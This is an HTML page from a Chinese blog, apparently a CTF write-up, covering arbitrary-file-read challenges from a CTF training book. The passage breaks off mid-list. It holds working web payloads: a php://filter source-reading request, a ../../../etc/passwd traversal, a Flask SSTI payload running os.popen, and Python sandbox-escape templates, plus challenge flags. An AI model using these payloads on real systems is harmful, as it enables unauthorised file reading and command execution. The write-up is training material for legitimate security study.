@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="任意文件读取概念：攻击者通过一些手段读取服务器上开发者不允许读到的文件，包括服务器的配置文件、文件形式存储的密钥、服务器信息、历史命令等等。 任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。  存读取文件的函数 读取文件的路径用户可控，且未校验或校验不严 输出了文件内容  readfile()、file_ge">
+<meta property="og:type" content="article">
+<meta property="og:title" content="每日一题3-24">
+<meta property="og:url" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/index.html">
+<meta property="og:site_name" content="L1E6N0A2">
+<meta property="og:description" content="任意文件读取概念：攻击者通过一些手段读取服务器上开发者不允许读到的文件，包括服务器的配置文件、文件形式存储的密钥、服务器信息、历史命令等等。 任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。  存读取文件的函数 读取文件的路径用户可控，且未校验或校验不严 输出了文件内容  readfile()、file_ge">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/hello.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/hello.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/no.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/no.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/filter.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/filter.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/base64.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/base64.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/gif.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/gif.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/img.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/img.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/图.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/%E7%BC%A9%E7%9F%AD.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/缩短.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/flag.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/flag.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/final.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/final.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/a.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/a.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/b.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/b.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/c.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/c.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/cc.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/cc.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/d.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/d.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/permission.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/permission.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/session.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/session.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/none.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/none.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/pythonserver.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/pythonserver.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/all.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/all.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/key.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/key.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/encode.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/encode.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/afr3.png">
+<meta property="og:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog/blog/source_posts/每日一题3-24/afr3.png">
+<meta property="article:published_time" content="2021-03-24T02:57:43.000Z">
+<meta property="article:modified_time" content="2021-03-27T06:04:09.019Z">
+<meta property="article:author" content="lyj789">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/hello.png">
+
+<link rel="canonical" href="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>每日一题3-24 | L1E6N0A2</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">L1E6N0A2</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">监督自己不断学习</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lyj789">
+      <meta itemprop="description" content="快乐打工人">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L1E6N0A2">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          每日一题3-24
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-24 10:57:43" itemprop="dateCreated datePublished" datetime="2021-03-24T10:57:43+08:00">2021-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-27 14:04:09" itemprop="dateModified" datetime="2021-03-27T14:04:09+08:00">2021-03-27</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>概念：攻击者通过一些手段读取服务器上开发者不允许读到的文件，包括服务器的配置文件、文件形式存储的密钥、服务器信息、历史命令等等。</p>
+<p>任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。</p>
+<ul>
+<li>存读取文件的函数</li>
+<li>读取文件的路径用户可控，且未校验或校验不严</li>
+<li>输出了文件内容</li>
+</ul>
+<p><code>readfile()</code>、<code>file_get_contents()</code>、<code>fopen()</code>中，<code>$filename</code>没有经过校验或者校验不合格，用户可控制变量读取任意文件，如<code>/etc/passwd</code>、<code>./index.php</code>、<code>/config.ini</code></p>
+<a id="more"></a>
+
+<h4 id="《从0到1-CTFer成长之路》"><a href="#《从0到1-CTFer成长之路》" class="headerlink" title="《从0到1 CTFer成长之路》"></a>《从0到1 CTFer成长之路》</h4><h4 id="afr1——filter为协议"><a href="#afr1——filter为协议" class="headerlink" title="afr1——filter为协议"></a>afr1——filter为协议</h4><p>打开网址看到下面的输出，注意到参数p，一看就是任意文件读取漏洞</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/hello.png" class title="hello">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\hello.png" alt="hello"></p>
+<p>试试flag（不带后缀，因为“hello”就没有后缀），输出nonono</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/no.png" class title="no">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\no.png" alt="no"></p>
+<p>下面使用“绝招”读源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/filter.png" class title="filter">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\filter.png" alt="filter"></p>
+<p>base64解码得到flag : <strong>n1book{afr_1_solved}</strong></p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/base64.png" class title="base64">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\base64.png" alt="base64"></p>
+<h4 id="afr2——目录穿越"><a href="#afr2——目录穿越" class="headerlink" title="afr2——目录穿越"></a>afr2——目录穿越</h4><p>打开之后是一个gif图像，查看源码看一下</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/gif.png" class title="gif">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\gif.png" alt="gif"></p>
+<p>看到gif的目录是img/img.gif试着访问一下</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/img.png" class title="img">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\img.png" alt="img"></p>
+<p>可以看到图片</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/%E5%9B%BE.png" class title="图">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\图.png" alt="图"></p>
+<p>继续缩短目录，发现img目录是可以访问的</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/%E7%BC%A9%E7%9F%AD.png" class title="缩短">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\缩短.png" alt="缩短"></p>
+<p>尝试改成/img../, 发现穿越到了上级目录：</p>
+<blockquote>
+<p>Nginx目录穿越漏洞：Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。这个/就导致我们可以从/home/目录穿越到他的上层目录</p>
+<p>使用filename参数加载图像文件，图片文件位置可能映射在 /var/www/images/ 上，所以真实的路径是 /var/www/images/214.png ，这样构造url即可实现穿越?filename=../../../etc/passwd</p>
+</blockquote>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/flag.png" class title="flag">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\flag.png" alt="flag"></p>
+<p>直接打开flag目录，获得flag： <strong>n1book{afr_2_solved}</strong></p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/final.png" class title="final">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\final.png" alt="final"></p>
+<h4 id="afr3——flask的session伪造"><a href="#afr3——flask的session伪造" class="headerlink" title="afr3——flask的session伪造"></a>afr3——flask的session伪造</h4><p>三个页面，连贯的操作</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/a.png" class title="a">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\a.png" alt="a"></p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/b.png" class title="b">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\b.png" alt="b"></p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/c.png" class title="c">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\c.png" alt="c"></p>
+<p>最后一个页面的URL如下：</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/cc.png" class title="cc">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\cc.png" alt="cc"></p>
+<p>看到name=artical，试试换成别的比如“aa”，显示没有这个文件，整个目录都暴露了</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/d.png" class title="d">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\d.png" alt="d"></p>
+<p>下面试试name=flag.php（name=flag也是no permission），有这个文件，但是没有访问权限。</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/permission.png" class title="permission">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\permission.png" alt="permission"></p>
+<p>看看了别人的WP，发现需要用<strong>flask的session伪造</strong>获取flag</p>
+<p>（<a target="_blank" rel="noopener" href="https://github.com/mo-xiaoxi/CTF_Web_docker/tree/master/HCTF2018/Hideandseek%EF%BC%8C%E8%BF%99%E9%81%93%E9%A2%98%E4%B9%9F%E7%94%A8%E5%88%B0%E4%BA%86%E8%BF%99%E4%B8%AA%E6%96%B9%E6%B3%95%EF%BC%8C%E6%9C%89%E6%9C%BA%E4%BC%9A%E5%A4%8D%E7%8E%B0%E4%B8%80%E4%B8%8B%E3%80%82WP%EF%BC%9Ahttps://www.jianshu.com/p/d20168da7284">https://github.com/mo-xiaoxi/CTF_Web_docker/tree/master/HCTF2018/Hideandseek，这道题也用到了这个方法，有机会复现一下。WP：https://www.jianshu.com/p/d20168da7284</a> ）</p>
+<p>修改session，伪造admin用户，<strong>伪造session一定要密钥！！！</strong></p>
+<p>Flask加密脚本：<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<p>首先看看现在的session形式（F12）：</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/session.png" class title="session">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\session.png" alt="session"></p>
+<p>解密看一下session的格式，解密脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  print(decryption(<span class="string">&quot;eyJuMWNvZGUiOm51bGx9.YFr4cQ.gICS3BUHd4fvIyDIX_HveI4LESg&quot;</span>.encode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/none.png" class title="none">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\none.png" alt="none"></p>
+<p>输出{‘n1code’: None}，猜测把None改成admin试试，不对，正确的session应该是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行任意命令</span></span><br><span class="line">&#123;<span class="string">&#x27;n1code&#x27;</span>: <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat flag.py&#x27;).read()&#125;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面是几个常用的注入模板（<strong>python沙箱逃逸？</strong>）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="number">2.</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="number">3.</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span> )</span><br></pre></td></tr></table></figure>
+
+<p>下一步是重新加密，密钥key在key.py, 怎么知道有key.py这个文件的呢.</p>
+<p><strong>第二个知识点：Linux系统中的\proc\目录</strong></p>
+<blockquote>
+<p>关于/proc/目录<br>Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p>
+<ul>
